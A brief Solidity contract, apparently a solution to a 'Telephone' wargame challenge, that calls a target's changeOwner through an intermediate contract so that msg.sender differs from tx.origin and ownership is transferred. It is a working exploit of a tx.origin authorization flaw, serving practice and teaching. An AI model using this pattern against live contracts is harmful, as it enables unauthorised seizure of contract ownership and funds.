// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }

    fallback() external payable {}
}